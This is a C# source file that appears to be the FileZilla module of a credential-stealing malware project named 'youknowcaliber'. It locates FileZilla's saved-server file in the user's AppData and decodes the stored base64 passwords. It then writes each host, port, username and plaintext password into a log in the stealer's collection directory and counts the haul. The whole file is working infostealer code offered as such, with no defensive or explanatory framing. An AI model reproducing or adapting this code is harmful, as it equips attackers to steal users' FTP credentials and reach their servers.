using System;
using System.IO;
using System.Text;
using System.Xml;

namespace youknowcaliber
{
    class FileZilla
    {
        private static StringBuilder SB = new StringBuilder();
        public static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml");

        public static void GetFileZilla()
        {
            string Stealer_Dir = Help.ExploitDir;
            if (!File.Exists(FzPath))
                return;

            Directory.CreateDirectory(Stealer_Dir + "\\FileZilla");
            GetDataFileZilla(FzPath, Stealer_Dir + "\\FileZilla" + "\\FileZilla.log");

            
        }
        public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
        {
            try
            {
                if (File.Exists(PathFZ))
                {
                    var xf = new XmlDocument();
                    xf.Load(PathFZ);
                    foreach (XmlElement XE in ((XmlElement)xf.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
                    {
                        var Host = XE.GetElementsByTagName("Host")[0].InnerText;
                        var Port = XE.GetElementsByTagName("Port")[0].InnerText;
                        var User = XE.GetElementsByTagName("User")[0].InnerText;
                        var Pass = (Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName("Pass")[0].InnerText)));
                        if (!string.IsNullOrEmpty(Host) && !string.IsNullOrEmpty(Port) && !string.IsNullOrEmpty(User) && !string.IsNullOrEmpty(Pass))
                        {
                            SB.AppendLine($"Host: {Host}");
                            SB.AppendLine($"Port: {Port}");
                            SB.AppendLine($"User: {User}");
                            SB.AppendLine($"Pass: {Pass}\r\n");
                            Counting.FileZilla++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SB.Length > 0)
                    {
                            File.AppendAllText(SaveFile, SB.ToString());
                    }
                }
            }
            catch(Exception e) 
            {
                Console.WriteLine(e);
            }
        }
    }
}
